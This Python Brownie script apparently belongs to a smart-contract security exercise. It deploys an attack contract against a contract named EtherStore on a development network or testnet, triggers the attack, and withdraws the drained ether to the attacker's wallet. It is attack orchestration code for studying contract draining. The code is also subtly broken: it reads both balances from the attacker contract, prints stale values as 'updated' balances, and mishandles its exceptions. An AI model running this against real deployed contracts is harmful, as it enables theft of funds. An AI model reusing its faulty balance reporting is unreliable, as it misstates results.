from brownie import EtherStoreAttack, EtherStore, network, accounts
from scripts.helpful_scripts import get_account, deposit_value, TESTNET_ENVIRONMENTS
from web3 import Web3


def deploy_attacker():
    """
    Validates that attack contract is deployed, if it isn't, deploy one.
    """
    # Get appropriate account
    if network.show_active() in TESTNET_ENVIRONMENTS:
        account = get_account(id="test_acct_4")
        # Check if EtherStoreAttack exists in json map
        if len(EtherStoreAttack) <= 0:
            try:
                ether_store_address = EtherStore[-1].address
                print("Deploying attacker contract to testnet...")
                EtherStoreAttack.deploy(ether_store_address, {"from": account})
            except:
                IndexError
                print("EtherStore not deployed")
        else:
            print("EtherStoreAttack already deployed")
    # Deploy from development network
    else:
        account = accounts[0]
        print("Deploying EtherStore...")
        etherStore = EtherStore.deploy({"from": account})
        etherStore_address = etherStore.address
        print("Deploying attacker contract...")
        EtherStoreAttack.deploy(etherStore_address, {"from": account})


def attack():
    """
    Calls attack function against EtherStore and gives updates on contract balances
    """
    # Get appropriate account
    if network.show_active() in TESTNET_ENVIRONMENTS:
        print("\nEnter account password to begin attack...")
        account = get_account(id="test_acct_4")
    else:
        account = accounts[0]
    try:
        # Check to see if EtherStoreAttack is already deployed
        attacker_contract = EtherStoreAttack[-1]
    except:
        IndexError
        print("Attacker contract not yet deployed: please run deploy function")
    # Don't need try except block here since deploy_attacker already checks if EtherStore exists
    ether_store = EtherStore[-1]
    # Fetch balances of attack contract and EtherStore then convert values to ether
    attacker_contract_balance = Web3.fromWei(attacker_contract.getBalance(), "ether")
    ether_store_balance = Web3.fromWei(attacker_contract.getBalance(), "ether")
    print(f"EtherStoreAttack balance: {attacker_contract_balance} ether")
    print(f"EtherStore balance: {ether_store_balance} ether")
    try:
        # Execute the attack function to begin the attack
        attacker_contract.attack({"value": deposit_value, "from": account})
        print("Attack confirmed")
    except:
        # If the attack fails, you will get this statement
        print("Attack reverted")
    # Updated balances post-attack
    print(f"Updated EtherStoreAttack balance: {attacker_contract_balance} ether")
    print(f"Updated EtherStore balance: {ether_store_balance} ether")


def withdraw_from_contract():
    """
    Withdraws funds from attack contract -> attackers personal wallet
    """
    if network.show_active() in TESTNET_ENVIRONMENTS:
        print("\nWithdraw from attack contract -> attacker address")
        account = get_account(id="test_acct_4")
    else:
        account = accounts[0]
    # If EtherStore is not deployed run deploy function
    attacker_contract = EtherStoreAttack[-1]
    print(f"Withdrawing funds from attacker contract: {attacker_contract.address}")
    # Call withdraw function from EtherStoreAttack
    attacker_contract.withdraw({"from": account})
    print("Funds successfully deposited to contract owner")
    # Get balances once withdraw is successful
    attacker_balance = Web3.fromWei(account.balance(), "ether")
    attack_contract_balance = Web3.fromWei(attacker_contract.balance(), "ether")
    print(f"Attacker personal wallet account balance: {attacker_balance} ether")
    print(f"Attack contract balance: {attack_contract_balance} ether")
    # Check if there are any funds remaining in EtherStoreAttack
    if attacker_balance > attack_contract_balance:
        print("Contract balance successfully sent to attacker address")
    else:
        print("Could not withdraw all funds from attacker contract")


def main():
    deploy_attacker()
    attack()
    withdraw_from_contract()
